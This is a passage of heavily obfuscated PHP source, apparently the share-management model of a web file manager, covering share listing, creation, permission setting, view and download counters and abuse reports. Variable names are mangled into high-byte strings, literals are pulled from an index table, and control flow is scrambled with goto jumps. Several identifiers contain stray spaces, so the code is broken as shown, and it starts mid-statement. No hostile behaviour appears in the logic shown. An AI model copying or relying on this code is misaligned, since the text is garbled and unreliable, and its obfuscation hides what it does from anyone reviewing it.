array($C¢ó­¸ç£ô[993], 0), $C¢ó­¸ç£ô[1858] => $C¢ó­¸ç£ô[1812])); if ($cƒ·•ãÏ·Æ == $C¢ó­¸ç£ô[1859]) { $AŞÃƒÍ§ó— = array($C¢ó­¸ç£ô[496] => 1); } else { if ($cƒ·•ãÏ·Æ == $C¢ó­¸ç£ô[1078]) { $AŞÃƒÍ§ó— = array($C¢ó­¸ç£ô[498] => 1); } } $AŞÃƒÍ§ó—[$C¢ó­¸ç£ô[1551]] = USER_ID; $D˜ˆ°ƒ¾Ûƒ = $this->where($AŞÃƒÍ§ó—)->selectPage($cš±…Ã¥¸); return $D˜ˆ°ƒ¾Ûƒ; } protected function listToMe($FÑ¨æÓƒ“ƒ = 300) { goto cêáŠ¹Ã‘…; cêáŠ¹Ã‘…: $a¦«èÖ·Ûã =& $_SERVER[œÕÊİğö]; $Aç§Ù¢ŠÆ† = Model($a¦«èÖ·Ûã[1860])->userGroupParents(USER_ID); $BØ‚˜ÛªÛÈ = array($a¦«èÖ·Ûã[583] => SourceModel::TYPE_USER, $a¦«èÖ·Ûã[507] => USER_ID); goto D……¨Ç†‰; Aê‡œ×íøÖ: $e‚¦¶¾¿Àî = array($a¦«èÖ·Ûã[1862] => $b‰ç­ä‚§Œ, $a¦«èÖ·Ûã[1863] => $cæ¬Œ•¶õß[$a¦«èÖ·Ûã[374]]); return $e‚¦¶¾¿Àî; goto D¨áñò Ã; D……¨Ç†‰: if ($Aç§Ù¢ŠÆ†) { $BØ‚˜ÛªÛÈ = array(array($a¦«èÖ·Ûã[583] => SourceModel::TYPE_USER, $a¦«èÖ·Ûã[507] => USER_ID), array($a¦«èÖ·Ûã[583] => SourceModel::TYPE_GROUP, $a¦«èÖ·Ûã[507] => array($a¦«èÖ·Ûã[7], $Aç§Ù¢ŠÆ†)), $a¦«èÖ·Ûã[1858] => $a¦«èÖ·Ûã[1812]); } $cæ¬Œ•¶õß = Model($a¦«èÖ·Ûã[599])->where($BØ‚˜ÛªÛÈ)->selectPage($FÑ¨æÓƒ“ƒ); $a„Õ†Æ²éø = array_to_keyvalue_group($cæ¬Œ•¶õß[$a¦«èÖ·Ûã[377]], $a¦«èÖ·Ûã[491]); goto cëŒ»©„«Û; eœßÌïŸ: $b‰ç­ä‚§Œ = $this->field($eùöì„«Ï)->where($BØ‚˜ÛªÛÈ)->select(); foreach ($b‰ç­ä‚§Œ as $B¹­•š…Ô => &$AÔ˜ŠÁíÛ) { $AÔ˜ŠÁíÛ[$a¦«èÖ·Ûã[1857]] = $a„Õ†Æ²éø[$AÔ˜ŠÁíÛ[$a¦«èÖ·Ûã[491]]]; } unset($AÔ˜ŠÁíÛ); goto Aê‡œ×íøÖ; cëŒ»©„«Û: if (!$a„Õ†Æ²éø) { return $cæ¬Œ•¶õß; } $eùöì„«Ï = $a¦«èÖ·Ûã[1861]; $BØ‚˜ÛªÛÈ = array($a¦«èÖ·Ûã[491] => array($a¦«èÖ·Ûã[422], array_keys($a„Õ†Æ²éø)), $a¦«èÖ·Ûã[1551] => array($a¦«èÖ·Ûã[995], $a¦«èÖ·Ûã[201])); goto eœßÌïŸ; D¨áñò Ã: } protected function shareAdd($BÄ›ºÓà™Ã, $eÜ‰ëßºÆó) { $c‚»ßª×É =& $_SERVER[œÕÊİğö]; $EŸ‰İô© = $this->_addShareData($BÄ›ºÓà™Ã, $eÜ‰ëßºÆó); if (!empty($eÜ‰ëßºÆó[$c‚»ßª×É[1864]])) { $this->_shareAuthSet($EŸ‰İô©, $eÜ‰ëßºÆó[$c‚»ßª×É[1864]]); } $this->shareEventAdd($BÄ›ºÓà™Ã, $eÜ‰ëßºÆó, $c‚»ßª×É[1081]); return $EŸ‰İô©; } protected function shareAddSystem($d£íªÇƒ¶¯, $e¤ÔÏäİÃé) { $c—ÀÖˆ°œ =& $_SERVER[œÕÊİğö]; $CçÒá½•¦ = $this->_addShareData($d£íªÇƒ¶¯, $e¤ÔÏäİÃé, $c—ÀÖˆ°œ[1193]); $this->_shareAuthSet($CçÒá½•¦, $e¤ÔÏäİÃé[$c—ÀÖˆ°œ[1864]]); return $CçÒá½•¦; } private function shareEventAdd($e’…ÍÀÈÒâ, $bº›œâÂ„Å, $e†‡²Û¾Ú„ = "\x61\x64\144") { goto AÀéÏòÙå‰; A¯–¦’Õòî: $C‚›µÓÕò = $this->getInfoByPath($e’…ÍÀÈÒâ); $B½ä‘ËÚßÑ = $F§Ó‚®øæÆ[1867]; if ($C‚›µÓÕò[$F§Ó‚®øæÆ[496]] == $F§Ó‚®øæÆ[201] && $bº›œâÂ„Å[$F§Ó‚®øæÆ[496]] == $F§Ó‚®øæÆ[97]) { $B½ä‘ËÚßÑ = $F§Ó‚®øæÆ[1865]; } goto eî£›âÃ÷¤; eî£›âÃ÷¤: if ($C‚›µÓÕò[$F§Ó‚®øæÆ[496]] == $F§Ó‚®øæÆ[97] && $bº›œâÂ„Å[$F§Ó‚®øæÆ[496]] == $F§Ó‚®øæÆ[201]) { $B½ä‘ËÚßÑ = $F§Ó‚®øæÆ[1868]; } if ($C‚›µÓÕò[$F§Ó‚®øæÆ[498]] == $F§Ó‚®øæÆ[201] && $bº›œâÂ„Å[$F§Ó‚®øæÆ[498]] == $F§Ó‚®øæÆ[97]) { $B½ä‘ËÚßÑ = $F§Ó‚®øæÆ[1866]; } if ($C‚›µÓÕò[$F§Ó‚®øæÆ[498]] == $F§Ó‚®øæÆ[97] && $bº›œâÂ„Å[$F§Ó‚®øæÆ[498]] == $F§Ó‚®øæÆ[201]) { $B½ä‘ËÚßÑ = $F§Ó‚®øæÆ[1869]; } goto dø ø¡ëô÷; AÀéÏòÙå‰: $F§Ó‚®øæÆ =& $_SERVER[œÕÊİğö]; if (!$e’…ÍÀÈÒâ || $e’…ÍÀÈÒâ == $F§Ó‚®øæÆ[201]) { return; } if ($e†‡²Û¾Ú„ == $F§Ó‚®øæÆ[1081]) { if ($bº›œâÂ„Å[$F§Ó‚®øæÆ[496]] == $F§Ó‚®øæÆ[97]) { Model($F§Ó‚®øæÆ[567])->eventShare($e’…ÍÀÈÒâ, $F§Ó‚®øæÆ[1865]); } if ($bº›œâÂ„Å[$F§Ó‚®øæÆ[498]] == $F§Ó‚®øæÆ[97]) { Model($F§Ó‚®øæÆ[567])->eventShare($e’…ÍÀÈÒâ, $F§Ó‚®øæÆ[1866]); } return; } goto A¯–¦’Õòî; dø ø¡ëô÷: Model($F§Ó‚®øæÆ[567])->eventShare($e’…ÍÀÈÒâ, $B½ä‘ËÚßÑ); return; goto f¬Ë´Åº«; f¬Ë´Åº«: } private function _addShareData($AğÃ³–Ê’, $f´×…³ é‰ = array(), $B›êŸ¥¿… = false) { goto a‡öÀÆô«’; A¥­Š‰íß: if ($AğÃ³–Ê’ == 0) { $BÕ¤’è³ = array($c”ĞÅ’¨Œä[1870] => $f´×…³ é‰[$c”ĞÅ’¨Œä[1093]], $c”ĞÅ’¨Œä[1542] => $fŸ”Ñ…¯É); } if ($bÔ–• šä™ = $this->where($BÕ¤’è³)->find()) { return $bÔ–• šä™[$c”ĞÅ’¨Œä[491]]; } if ($AğÃ³–Ê’ == 0) { $B¸ÚÌ«â¯Õ = array($c”ĞÅ’¨Œä[38] => get_path_this($f´×…³ é‰[$c”ĞÅ’¨Œä[86]])); } else { $B¸ÚÌ«â¯Õ = Model($c”ĞÅ’¨Œä[822])->sourceInfo($AğÃ³–Ê’); if (!$B¸ÚÌ«â¯Õ) { return !1; } } goto DŠŒ¹ì…ˆÀ; DŠŒ¹ì…ˆÀ: if (!$f´×…³ é‰[$c”ĞÅ’¨Œä[1452]]) { $f´×…³ é‰[$c”ĞÅ’¨Œä[1452]] = $B¸ÚÌ«â¯Õ[$c”ĞÅ’¨Œä[38]]; } $F÷ç­Õ¯³œ = array($c”ĞÅ’¨Œä[1542] => $fŸ”Ñ…¯É, $c”ĞÅ’¨Œä[421] => $AğÃ³–Ê’, $c”ĞÅ’¨Œä[1452] => $c”ĞÅ’¨Œä[43], $c”ĞÅ’¨Œä[496] => 0, $c”ĞÅ’¨Œä[498] => 0, $c”ĞÅ’¨Œä[1093] => $c”ĞÅ’¨Œä[43], $c”ĞÅ’¨Œä[315] => $c”ĞÅ’¨Œä[43], $c”ĞÅ’¨Œä[873] => $c”ĞÅ’¨Œä[43], $c”ĞÅ’¨Œä[1871] => 0, $c”ĞÅ’¨Œä[1872] => 0, $c”ĞÅ’¨Œä[499] => 0, $c”ĞÅ’¨Œä[500] => $c”ĞÅ’¨Œä[43], $c”ĞÅ’¨Œä[493] => $c”ĞÅ’¨Œä[43]); $aÊÚ÷ÀÒî = explode($c”ĞÅ’¨Œä[57], $c”ĞÅ’¨Œä[1873]); goto có¾òŠÏº¦; a‡öÀÆô«’: $c”ĞÅ’¨Œä =& $_SERVER[œÕÊİğö]; $fŸ”Ñ…¯É = $B›êŸ¥¿… == $c”ĞÅ’¨Œä[1193] ? 0 : USER_ID; $BÕ¤’è³ = array($c”ĞÅ’¨Œä[421] => $AğÃ³–Ê’, $c”ĞÅ’¨Œä[1542] => $fŸ”Ñ…¯É); goto A¥­Š‰íß; có¾òŠÏº¦: foreach ($aÊÚ÷ÀÒî as $Dƒà©¨Š¢Û) { if (!isset($f´×…³ é‰[$Dƒà©¨Š¢Û])) { continue; } $F÷ç­Õ¯³œ[$Dƒà©¨Š¢Û] = $f´×…³ é‰[$Dƒà©¨Š¢Û]; } $FŸëºÄ•Ñ = $this->add($F÷ç­Õ¯³œ); $A¼¹ËÎÖœÔ = array($c”ĞÅ’¨Œä[493] => short_id($FŸëºÄ•Ñ)); goto b‹ÙÚÚÈ”Á; b‹ÙÚÚÈ”Á: $this->where(array($c”ĞÅ’¨Œä[490] => $FŸëºÄ•Ñ))->save($A¼¹ËÎÖœÔ); return $FŸëºÄ•Ñ; goto Eâ¸Í”„Ûš; Eâ¸Í”„Ûš: } private function _shareAuthSet($eä¥Ù¢ÂˆÃ, $FÜ³à™“­Œ) { goto dó½·êƒÀÎ; dó½·êƒÀÎ: $FÍ‹®‚Íµ‘ =& $_SERVER[œÕÊİğö]; if (!is_array($FÜ³à™“­Œ)) { return !1; } $c‘Ë¾¿†Î„ = Model($FÍ‹®‚Íµ‘[1824]); goto c©ÖŞ†ŒÜÃ; c©ÖŞ†ŒÜÃ: $c‘Ë¾¿†Î„->where(array($FÍ‹®‚Íµ‘[491] => $eä¥Ù¢ÂˆÃ))->delete(); $dƒÏÈ¾¥Æ† = array(); foreach ($FÜ³à™“­Œ as $CØñÔ›‰ˆ) { $f²È¡äêâ¢ = SourceModel::TYPE_USER; if ($CØñÔ›‰ˆ[$FÍ‹®‚Íµ‘[415]] == SourceModel::TYPE_GROUP) { $f²È¡äêâ¢ = SourceModel::TYPE_GROUP; } $bÅ˜Å¹¿¹ä = array($FÍ‹®‚Íµ‘[491] => $eä¥Ù¢ÂˆÃ, $FÍ‹®‚Íµ‘[415] => $f²È¡äêâ¢, $FÍ‹®‚Íµ‘[507] => intval($CØñÔ›‰ˆ[$FÍ‹®‚Íµ‘[507]]), $FÍ‹®‚Íµ‘[1820] => 0, $FÍ‹®‚Íµ‘[1874] => -1); if ($CØñÔ›‰ˆ[$FÍ‹®‚Íµ‘[1820]]) { $bÅ˜Å¹¿¹ä[$FÍ‹®‚Íµ‘[1820]] = $CØñÔ›‰ˆ[$FÍ‹®‚Íµ‘[1820]]; } else { if ($CØñÔ›‰ˆ[$FÍ‹®‚Íµ‘[1874]]) { $bÅ˜Å¹¿¹ä[$FÍ‹®‚Íµ‘[1874]] = $CØñÔ›‰ˆ[$FÍ‹®‚Íµ‘[1874]]; } } $dƒÏÈ¾¥Æ†[] = $bÅ˜Å¹¿¹ä; } goto BÔ—ùºÁš¦; BÔ—ùºÁš¦: return $c‘Ë¾¿†Î„->addAll($dƒÏÈ¾¥Æ†, array(), !0); goto fÏ…¼á¿ô; fÏ…¼á¿ô: } public function numViewAdd($fòå‰¶¨˜Ö) { $dŞâ¼á³‰ =& $_SERVER[œÕÊİğö]; $C‰Ú‘¡ö×© = array($dŞâ¼á³‰[490] => $fòå‰¶¨˜Ö); $this->where($C‰Ú‘¡ö×©)->setAdd($dŞâ¼á³‰[1871]); } public function numDownloadAdd($dÔ¾¡šó ¾) { $aó³§ß‹¢· =& $_SERVER[œÕÊİğö]; $eŠ¼Ë×Ã³Ù = array($aó³§ß‹¢·[490] => $dÔ¾¡šó ¾); $this->where($eŠ¼Ë×Ã³Ù)->setAdd($aó³§ß‹¢·[1872]); } protected function shareEdit($aÜåêßØçÖ, $c¯–èËĞœ) { goto f¯‡ˆ¶ùß; CêÃÏ¶‰¨Ì: foreach ($BÄ‘‡±îÍ½ as $BÈÙõäÖ¾) { if (!array_key_exists($BÈÙõäÖ¾, $c¯–èËĞœ)) { continue; } $EÍ½†Úô˜[$BÈÙõäÖ¾] = $c¯–èËĞœ[$BÈÙõäÖ¾]; } $this->shareEventAdd($F„ÌÊ·™íÄ[$Fäœ„•“§Ç[406]], $c¯–èËĞœ, $Fäœ„•“§Ç[1687]); $this->where(array($Fäœ„•“§Ç[490] => $aÜåêßØçÖ))->save($EÍ½†Úô˜); goto aˆ©“’ğ ¢; f¯‡ˆ¶ùß: $Fäœ„•“§Ç =& $_SERVER[œÕÊİğö]; $F„ÌÊ·™íÄ = $this->getInfo($aÜåêßØçÖ); if (!$F„ÌÊ·™íÄ) { return !1; } goto D÷¸¥öï ã; D÷¸¥öï ã: $this->_checkLinkShare($c¯–èËĞœ, $F„ÌÊ·™íÄ); $EÍ½†Úô˜ = array(); $BÄ‘‡±îÍ½ = explode($Fäœ„•“§Ç[57], $Fäœ„•“§Ç[1875]); goto CêÃÏ¶‰¨Ì; aˆ©“’ğ ¢: if (isset($c¯–èËĞœ[$Fäœ„•“§Ç[1864]])) { $this->_shareAuthSet($aÜåêßØçÖ, $c¯–èËĞœ[$Fäœ„•“§Ç[1864]]); } return !0; goto CŒ±ÇÓÈÂ–; CŒ±ÇÓÈÂ–: } private function _checkLinkShare($aÀÚ•²¾»Š, $bŠÈ—Ÿ°Ø) { goto f‚Šâ‚²İÓ; C“ó×ß¶¢è: $bÊ¨ìäÉŒ± = $this->shareFileMeta($A‘è•ä—Ì£[$CÇä¡¼Š¿í[470]]); if (isset($bÊ¨ìäÉŒ±[$CÇä¡¼Š¿í[382]]) && $bÊ¨ìäÉŒ±[$CÇä¡¼Š¿í[382]] == $CÇä¡¼Š¿í[97]) { show_json(LNG($CÇä¡¼Š¿í[1878]), !1); } goto EášëªÖô”; a·‘«•¨œÎ: if ($bŠÈ—Ÿ°Ø[$CÇä¡¼Š¿í[95]][$CÇä¡¼Š¿í[39]] != $CÇä¡¼Š¿í[203]) { $eÛåğİòÜ = $this->_folderReport($e‚š¤­±º); if (!$eÛåğİòÜ) { return; } show_json(LNG($CÇä¡¼Š¿í[1876]) . $CÇä¡¼Š¿í[1877] . $eÛåğİòÜ, !1); } $A‘è•ä—Ì£ = Model($CÇä¡¼Š¿í[822])->fileInfoGet($bŠÈ—Ÿ°Ø[$CÇä¡¼Š¿í[95]][$CÇä¡¼Š¿í[406]]); if (!$A‘è•ä—Ì£) { return; } goto C“ó×ß¶¢è; f‚Šâ‚²İÓ: $CÇä¡¼Š¿í =& $_SERVER[œÕÊİğö]; if ($aÀÚ•²¾»Š[$CÇä¡¼Š¿í[496]] != $CÇä¡¼Š¿í[97]) { return; } $e‚š¤­±º = $bŠÈ—Ÿ°Ø[$CÇä¡¼Š¿í[95]][$CÇä¡¼Š¿í[406]]; goto a·‘«•¨œÎ; EášëªÖô”: } private function _folderReport($f¶ÛÉ„âÉ) { goto D³ºÈ„¼Ô; D³ºÈ„¼Ô: $fŞ‚ì¿Ôàì =& $_SERVER[œÕÊİğö]; $C¬ê……Í£— = array($fŞ‚ì¿Ôàì[470] => array($fŞ‚ì¿Ôàì[993], 0), $fŞ‚ì¿Ôàì[740] => 3); $dğ÷ƒÎ“³î = Model($fŞ‚ì¿Ôàì[1879])->where($C¬ê……Í£—)->field($fŞ‚ì¿Ôàì[470])->select(); goto b™é•Šá; b™é•Šá: if (!$dğ÷ƒÎ“³î) { return !1; } $dğ÷ƒÎ“³î = array_to_keyvalue($dğ÷ƒÎ“³î, $fŞ‚ì¿Ôàì[43], $fŞ‚ì¿Ôàì[470]); $f‰õÎŠôÆ = $fŞ‚ì¿Ôàì[57] . $f¶ÛÉ„âÉ . $fŞ‚ì¿Ôàì[57]; goto cå†±¡¹ÀÀ; cå†±¡¹ÀÀ: $C¬ê……Í£— = array($fŞ‚ì¿Ôàì[470] => array($fŞ‚ì¿Ôàì[7], $dğ÷ƒÎ“³î), $fŞ‚ì¿Ôàì[524] => array($fŞ‚ì¿Ôàì[390], "\x25{$f‰õÎŠôÆ}\x25"), $fŞ‚ì¿Ôàì[434] => 0); $e–ËÇØŞš = Model($fŞ‚ì¿Ôàì[822])->where($C¬ê……Í£—)->field($fŞ‚ì¿Ôàì[1880])->find(); if (!$e–ËÇØŞš) { return !1; } goto bºìÖÉªèÄ; bºìÖÉªèÄ: $cÁÙîŞÏ¤± = substr($e–ËÇØŞš[$fŞ‚ì¿Ôàì[524]], strpos($e–ËÇØŞš[$fŞ‚ì¿Ôàì[524]], $f‰õÎŠôÆ)); $C¬ê……Í£— = array($fŞ‚ì¿Ôàì[406] => array($fŞ‚ì¿Ôàì[7], trim($cÁÙîŞÏ¤±, $fŞ‚ì¿Ôàì[57]))); $EËà ß– = Model($fŞ‚ì¿Ôàì[822])->where($C¬ê……Í£—)->field($fŞ‚ì¿Ôàì[38])->select(); goto CÄõº¦ôÅ; CÄõº¦ôÅ: $e¤æ‚öÖ³¬ = array_to_keyvalue($EËà ß–, $fŞ‚ì¿Ôàì[43], $fŞ‚ì¿Ôàì[38]); $e¤æ‚öÖ³¬[] = $e–ËÇØŞš[$fŞ‚ì¿Ôàì[38]]; return implode($fŞ‚ì¿Ôàì[8], $e¤æ‚öÖ³¬); goto fˆŒñ„Ñ±; fˆŒñ„Ñ±: } protected function remove($EãßùÈÊÓñ) { goto dÉÏÍ¾Ñ·¶; bÏãÔô´ ä: $EÉ¨ŞÁ—î = $this->where($CƒÊÄì‘È)->delete(); if ($EÉ¨ŞÁ—î) { Model($c½¢Ú·ÎˆÄ[599])->where(array($c½¢Ú·ÎˆÄ[491] => $EãßùÈÊÓñ))->delete(); } $eŒ”æÏÊ™ˆ = is_array($EãßùÈÊÓñ) ? $EãßùÈÊÓñ[1] : array($EãßùÈÊÓñ); goto D·Å©Ì¥†Š; dÉÏÍ¾Ñ·¶: $c½¢Ú·ÎˆÄ =& $_SERVER[œÕÊİğö]; if (is_array($EãßùÈÊÓñ)) { $EãßùÈÊÓñ = array($c½¢Ú·ÎˆÄ[7], $EãßùÈÊÓñ); } $CƒÊÄì‘È = array($c½¢Ú·ÎˆÄ[491] => $EãßùÈÊÓñ); goto bÏãÔô´ ä; D·Å©Ì¥†Š: for ($c»²Øí³²ì = 0; $c»²Øí³²ì < count($eŒ”æÏÊ™ˆ); $c»²Øí³²ì++) { $BñÎÓÄ†¨ = $this->getInfo($eŒ”æÏÊ™ˆ[$c»²Øí³²ì]); if ($BñÎÓÄ†¨[$c½¢Ú·ÎˆÄ[498]] == $c½¢Ú·ÎˆÄ[97]) { Model($c½¢Ú·ÎˆÄ[567])->eventShare($BñÎÓÄ†¨[$c½¢Ú·ÎˆÄ[406]], $c½¢Ú·ÎˆÄ[1869]); } if ($BñÎÓÄ†¨[$c½¢Ú·ÎˆÄ[496]] == $c½¢Ú·ÎˆÄ[97]) { Model($c½¢Ú·ÎˆÄ[567])->eventShare($BñÎÓÄ†¨[$c½¢Ú·ÎˆÄ[406]], $c½¢Ú·ÎˆÄ[1868]); } } return $EÉ¨ŞÁ—î; goto FšŒæ“†Â; FšŒæ“†Â: } protected function removeBySource($D•÷©–ƒ¥) { goto aßªËï¶´¿; d¶Üî¢çõ¯: $this->where($c¾ñÇ¾Ìšá)->delete(); Model($dˆ£¯½ƒÜ[599])->where($c¾ñÇ¾Ìšá)->delete(); goto e½‹Ò„ñ¤ñ; aßªËï¶´¿: $dˆ£¯½ƒÜ =& $_SERVER[œÕÊİğö]; $c¾ñÇ¾Ìšá = array($dˆ£¯½ƒÜ[421] => array($dˆ£¯½ƒÜ[422], $D•÷©–ƒ¥)); $A×ƒ©íÜ = $this->field($dˆ£¯½ƒÜ[491])->where($c¾ñÇ¾Ìšá)->select(); goto cÌÅ¼¶ùè; cÌÅ¼¶ùè: $A×ƒ©íÜ = array_to_keyvalue($A×ƒ©íÜ, $dˆ£¯½ƒÜ[43], $dˆ£¯½ƒÜ[491]); if (!$A×ƒ©íÜ) { return; } $c¾ñÇ¾Ìšá = array($dˆ£¯½ƒÜ[490] => array($dˆ£¯½ƒÜ[422], $A×ƒ©íÜ)); goto d¶Üî¢çõ¯; e½‹Ò„ñ¤ñ: } public function listAll($bá§Ô—‡´) { goto bç­À¸‹‘; C£•ĞÚø: if ($bá§Ô—‡´[$EË…İíÍ³„[751]]) { $e³«ôÄÄ‘Ş = $bá§Ô—‡´[$EË…İíÍ³„[499]] ? $bá§Ô—‡´[$EË…İíÍ³„[499]] : strtotime(date($EË…İíÍ³„[1881])); $f¶‘¶ª»¿õ[$EË…İíÍ³„[204]] = array($EË…İíÍ³„[341], array($bá§Ô—‡´[$EË…İíÍ³„[751]], $e³«ôÄÄ‘Ş)); } if ($bá§Ô—‡´[$EË…İíÍ³„[39]]) { $f¶‘¶ª»¿õ[$bá§Ô—‡´[$EË…İíÍ³„[39]]] = 1; } else { $f¶‘¶ª»¿õ[] = array($EË…İíÍ³„[496] => array($EË…İíÍ³„[993], 0), $EË…İíÍ³„[498] => array($EË…İíÍ³„[993], 0), $EË…İíÍ³„[1858] => $EË…İíÍ³„[1812]); } if ($bá§Ô—‡´[$EË…İíÍ³„[1808]]) { $f¶‘¶ª»¿õ[] = array($EË…İíÍ³„[493] => $bá§Ô—‡´[$EË…İíÍ³„[1808]], $EË…İíÍ³„[1452] => array($EË…İíÍ³„[390], "\x25{$bá§Ô—‡´[$EË…İíÍ³„[1808]]}\45"), $EË…İíÍ³„[1858] => $EË…İíÍ³„[1812]); } goto d©ğ‡×àì; bç­À¸‹‘: $EË…İíÍ³„ =& $_SERVER[œÕÊİğö]; $f¶‘¶ª»¿õ = array(); if ($bá§Ô—‡´[$EË…İíÍ³„[1551]]) { $f¶‘¶ª»¿õ[$EË…İíÍ³„[1551]] = $bá§Ô—‡´[$EË…İíÍ³„[1551]]; } goto C£•ĞÚø; d©ğ‡×àì: $cí¼¬ï÷Ê£ = $this->_makeOrder()->where($f¶‘¶ª»¿õ)->selectPage(20); if (empty($cí¼¬ï÷Ê£[$EË…İíÍ³„[377]])) { return array(); } $this->_listDataApply($cí¼¬ï÷Ê£[$EË…İíÍ³„[377]]); goto f›…˜ÊÁÎ¶; f›…˜ÊÁÎ¶: return $cí¼¬ï÷Ê£; goto bÂØ¦—á³À; bÂØ¦—á³À: } public function listDataApply($DÌ—¥¹ê«•) { $this->_listDataApply($DÌ—¥¹ê«•); return $DÌ—¥¹ê«•; } private function _listDataApply(&$cœ«¾ÆŒÏÁ) { goto D³ÈÜìİ‰; f›¶‹Ù¥Õø: $AÊíòÏ«Õõ = array_to_keyvalue($cœ«¾ÆŒÏÁ, $D£Òš­÷ˆ£[43], $D£Òš­÷ˆ£[406]); $Fñ×÷ïƒÏ‰ = Model($D£Òš­÷ˆ£[822])->sourceListInfo($AÊíòÏ«Õõ, !0); foreach ($cœ«¾ÆŒÏÁ as $cˆ×ë×Ø => &$cå‹Ñ¹òÙ) { $C—¤–¼è = $cå‹Ñ¹òÙ[$D£Òš­÷ˆ£[1551]]; $cå‹Ñ¹òÙ[$D£Òš­÷ˆ£[1882]] = $f…¤£ÓëæÍ[$C—¤–¼è] ? $f…¤£ÓëæÍ[$C—¤–¼è] : !1; $Dî•õ…Ôèí = $cå‹Ñ¹òÙ[$D£Òš­÷ˆ£[406]]; $cå‹Ñ¹òÙ[$D£Òš­÷ˆ£[95]] = $Fñ×÷ïƒÏ‰[$Dî•õ…Ôèí] ? $Fñ×÷ïƒÏ‰[$Dî•õ…Ôèí] : !1; if ($cå‹Ñ¹òÙ[$D£Òš­÷ˆ£[95]][$D£Òš­÷ˆ£[434]] == $D£Òš­÷ˆ£[97]) { unset($cœ«¾ÆŒÏÁ[$cˆ×ë×Ø]); } if ($cå‹Ñ¹òÙ[$D£Òš­÷ˆ£[95]] != $D£Òš­÷ˆ£[201] && !$cå‹Ñ¹òÙ[$D£Òš­÷ˆ£[95]]) { unset($cœ«¾ÆŒÏÁ[$cˆ×ë×Ø]); } } goto e‘–ÉÀîí; e‘–ÉÀîí: unset($cå‹Ñ¹òÙ); $cœ«¾ÆŒÏÁ = array_values($cœ«¾ÆŒÏÁ); goto Båî¦õ‘¹»; D³ÈÜìİ‰: $D£Òš­÷ˆ£ =& $_SERVER[œÕÊİğö]; $dÛ®ã¢“„è = array_to_keyvalue($cœ«¾ÆŒÏÁ, $D£Òš­÷ˆ£[43], $D£Òš­÷ˆ£[1551]); $f…¤£ÓëæÍ = Model($D£Òš­÷ˆ£[541])->userListInfo(array_unique($dÛ®ã¢“„è)); goto f›¶‹Ù¥Õø; Båî¦õ‘¹»: } private function _makeOrder($dõ¡µ—½îñ = '') { goto d´ëº¨ÍÚ³; f÷Š˜›‚Š¾: $EåãŠ†ôÏ = Input::get($F‚£äµ±È‚[458], $F‚£äµ±È‚[7], $F‚£äµ±È‚[427], $dõÖÚÕ÷ÓØ); $FÔØ¦½…åù = Input::get($F‚£äµ±È‚[459], $F‚£äµ±È‚[7], $F‚£äµ±È‚[1883], array($F‚£äµ±È‚[1807], $F‚£äµ±È‚[453])); $FÔØ¦½…åù = $b¹õëÁ›š˜[$FÔØ¦½…åù]; goto cÄ…¥õ•¦œ; d´ëº¨ÍÚ³: $F‚£äµ±È‚ =& $_SERVER[œÕÊİğö]; $dõÖÚÕ÷ÓØ = array($F‚£äµ±È‚[204], $F‚£äµ±È‚[499], $F‚£äµ±È‚[1871], $F‚£äµ±È‚[1872]); $b¹õëÁ›š˜ = array($F‚£äµ±È‚[451] => $F‚£äµ±È‚[452], $F‚£äµ±È‚[453] => $F‚£äµ±È‚[454]); goto f÷Š˜›‚Š¾; cÄ…¥õ•¦œ: $dõ¡µ—½îñ = $dõ¡µ—½îñ . "{$EåãŠ†ôÏ}\x20{$FÔØ¦½…åù}"; return $this->order($dõ¡µ—½îñ); goto A›—¼ø¿ç®; A›—¼ø¿ç®: } public function reportAdd($DŠ«¬ ×¿Ò) { $dí…³äô„‹ =& $_SERVER[œÕÊİğö]; $b©ÜÑòØ² = array($dí…³äô„‹[491] => $DŠ«¬ ×¿Ò[$dí…³äô„‹[491]], $dí…³äô„‹[1551] => USER_ID); if (Model($dí…³äô„‹[1879])->where($b©ÜÑòØ²)->find()) { return !1; } $D—±Ñß’¤­ = array($dí…³äô„‹[491] => $DŠ«¬ ×¿Ò[$dí…³äô„‹[491]], $dí…³äô„‹[1452] => $DŠ«¬ ×¿Ò[$dí…³äô„‹[1452]], $dí…³äô„‹[406] => $DŠ«¬ ×¿Ò[$dí…³äô„‹[406]], $dí…³äô„‹[470] => $DŠ«¬ ×¿Ò[$dí…³äô„‹[470]], $dí…³äô„‹[1551] => USER_ID, $dí…³äô„‹[39] => $DŠ«¬ ×¿Ò[$dí…³äô„‹[39]], $dí…³äô„‹[454] => $DŠ«¬ ×¿Ò[$dí…³äô„‹[454]]); return Model($dí…³äô„‹[1879])->add($D—±Ñß’¤­); } public function reportList($f†ñ·ƒ¼²) { goto c‚¬¬ÌÙ‹; B²Ò´òÕ‰: if (empty($E»í‘ÆöéÕ[$E¦³›·Š²[377]])) { return array(); } $c–¤İ¯¤†í = array_to_keyvalue_group($E»í‘ÆöéÕ[$E¦³›·Š²[377]], $E¦³›·Š²[740], $E¦³›·Š²[491]); if (!empty($c–¤İ¯¤†í[0])) { $f†ñ·ƒ¼² = $c–¤İ¯¤†í[0]; $F¦ ğ¹©–– = array($E¦³›·Š²[491] => array($E¦³›·Š²[7], $f†ñ·ƒ¼²)); $f¡¼‹“»™Ï = $this->where($F¦ ğ¹©––)->field($E¦³›·Š²[491])->select(); $f¡¼‹“»™Ï = array_to_keyvalue($f¡¼‹“»™Ï, $E¦³›·Š²[43], $E¦³›·Š²[491]); $A­Ñ‰« —Ü = array_diff($f†ñ·ƒ¼², $f¡¼‹“»™Ï); if (!empty($A­Ñ‰« —Ü)) { foreach ($E»í‘ÆöéÕ[$E¦³›·Š²[377]] as $F®’Ö¢×‰÷ => $C•‘èÛ ÙŒ) { if (in_array($C•‘èÛ ÙŒ[$E¦³›·Š²[491]], $A­Ñ‰« —Ü)) { unset($E»í‘ÆöéÕ[$E¦³›·Š²[377]][$F®’Ö¢×‰÷]); } } } } goto B÷‡Åî›Š; FºëÔå‡¥Ù: if (isset($f†ñ·ƒ¼²[$E¦³›·Š²[39]]) && in_array($f†ñ·ƒ¼²[$E¦³›·Š²[39]], array($E¦³›·Š²[97], $E¦³›·Š²[438], $E¦³›·Š²[1884], $E¦³›·Š²[1885], $E¦³›·Š²[1886]))) { $F¦ ğ¹©––[$E¦³›·Š²[39]] = $f†ñ·ƒ¼²[$E¦³›·Š²[39]]; } if (isset($f†ñ·ƒ¼²[$E¦³›·Š²[740]]) && in_array($f†ñ·ƒ¼²[$E¦³›·Š²[740]], array($E¦³›·Š²[201], $E¦³›·Š²[97], $E¦³›·Š²[438], $E¦³›·Š²[1884]))) { $F¦ ğ¹©––[$E¦³›·Š²[740]] = $f†ñ·ƒ¼²[$E¦³›·Š²[740]]; } 